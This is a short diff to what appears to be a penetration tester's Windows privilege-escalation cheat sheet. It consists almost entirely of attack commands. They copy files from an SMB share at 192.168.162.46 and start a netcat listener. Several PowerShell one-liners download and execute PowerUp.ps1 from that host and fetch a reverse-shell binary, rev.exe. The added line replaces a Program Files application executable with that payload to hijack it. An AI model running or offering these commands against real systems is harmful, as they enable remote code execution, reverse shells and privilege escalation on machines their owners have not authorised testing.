@@ -10,8 +10,9 @@ copy \\192.168.162.46\share\*
 
 ---------------------
 nc -nvlp 80
-powershell.exe (New-Object System.Net.WebClient).Downloadfile('http://192.168.162.46/rev.exe','rev.exe')
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.162.46/PowerUp.ps1')
+powershell.exe (New-Object System.Net.WebClient).Downloadfile('http://192.168.162.46/rev.exe','rev.exe')
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/rev.exe', 'C:\Program Files\Bad App\App.exe')"
 
 ---------------------
 cd ~\tools\privesc_windows
